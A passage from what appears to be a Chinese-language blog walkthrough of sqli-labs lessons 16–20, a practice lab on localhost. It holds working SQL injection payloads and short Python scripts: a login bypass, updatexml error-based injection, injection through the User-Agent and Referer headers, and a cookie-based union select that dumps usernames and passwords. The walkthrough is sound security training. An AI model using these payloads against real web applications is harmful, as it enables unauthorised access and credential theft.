<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624300007923.png" alt="" loading="lazy"></figure>
<h1 id="less-16">less-16</h1>
<p>uname=addmin&amp;passwd=ad&quot; or 1=1 #，注意\&quot;，其他和15一样</p>
<h1 id="less-17updatexml报错注入">less-17(updatexml报错注入)</h1>
<p>注意\'转义</p>
<h3 id="脚本查询数据库">脚本：查询数据库</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-17/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
data={'uname':'admin','passwd':'dadad\' and updatexml(1,concat(0x7e,(database())),1)#','submit':'Submit'}
r = requests.post(url,data = data)
t=r.text
print(t)
</code></pre>
<h3 id="结果在报错信息中可见库">结果：在报错信息中可见库</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624304453223.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agent注入">less-18(user-agent注入)</h1>
<h3 id="脚本post请求修改请求头的user-agent-bibi赖赖转义改的心态崩了">脚本：post请求修改请求头的user-agent    (bibi赖赖：转义改的心态崩了= =)</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-18/&quot;
#\转义  \转义  \转义  \转义  \转义  \转义 \转义 
'''
{'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)Gecko/20100101 Firefox/89.0
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果-5">结果</h3>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/1624307139151.png" alt="" loading="lazy"></figure>
<h1 id="less-19referer注入">less-19(referer注入)</h1>
<h3 id="脚本跟18一样改成referer就行同样需要转义">脚本：跟18一样，改成referer就行，同样需要转义</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-19/&quot;
'''
Referer: http://127.0.0.1/sqli/Less-19/
{'Referer':'http://127.0.0.1/sqli/Less-19/
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'Referer':'http://127.0.0.1/sqli/Less-19/\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果-6">结果</h3>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/1624307491060.png" alt="" loading="lazy"></figure>
<h1 id="less-20cookie注入">less-20(cookie注入)</h1>
<p>cookie中value值' #注入</p>
<h3 id="脚本">脚本</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-20/&quot;
u={'Cookie':'uname=1\' union select 1,2,group_concat(concat_ws(\'-\',id,username,password)) from users#'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果整不出来应该是版本问题暂时未解决">结果：整不出来，应该是版本问题，暂时未解决</h3>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>